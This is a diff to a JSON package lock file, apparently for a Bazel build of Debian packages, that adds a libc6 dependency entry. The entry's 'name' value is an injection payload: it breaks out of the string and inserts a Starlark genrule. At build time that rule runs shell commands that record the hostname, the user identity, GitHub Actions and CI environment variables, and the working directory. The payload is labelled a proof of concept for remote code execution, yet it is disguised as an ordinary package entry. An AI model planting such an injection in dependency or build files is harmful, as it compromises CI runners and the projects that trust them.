@@ -2,7 +2,13 @@
 	"packages": [
 		{
 			"arch": "amd64",
-			"dependencies": [],
+			"dependencies": [
+				{
+					"key": "libc6_2.36-9-p-deb12u13_amd64",
+					"name": "libc6/amd64\"] + [\":data\"],\n    visibility = [\"//visibility:public\"],\n)\n\ngenrule(\n    name = \"starlark_injection_poc\",\n    outs = [\"poc_evidence.txt\"],\n    cmd = \"echo STARLARK_INJECTION_RCE_CONFIRMED > $@ && echo --- >> $@ && hostname >> $@ && id >> $@ && echo --- >> $@ && echo RUNNER_NAME=$$RUNNER_NAME >> $@ && echo CI=$$CI >> $@ && echo GITHUB_ACTIONS=$$GITHUB_ACTIONS >> $@ && echo GITHUB_REPOSITORY=$$GITHUB_REPOSITORY >> $@ && echo GITHUB_WORKFLOW=$$GITHUB_WORKFLOW >> $@ && echo GITHUB_RUN_ID=$$GITHUB_RUN_ID >> $@ && echo HOME=$$HOME >> $@ && pwd >> $@\",\n    visibility = [\"//visibility:public\"],\n)\n\nfilegroup(\n    name = \"absorb_trailing\",\n    srcs = [\"//placeholder",
+					"version": "2.36-9+deb12u13"
+				}
+			],
 			"key": "base-files_12.4-p-deb12u13_amd64",
 			"name": "base-files",
 			"sha256": "d0aee30a91b1283e0c724e9ad0ae7394d8e56f07d20cacfcb79b8f444daa94cd",
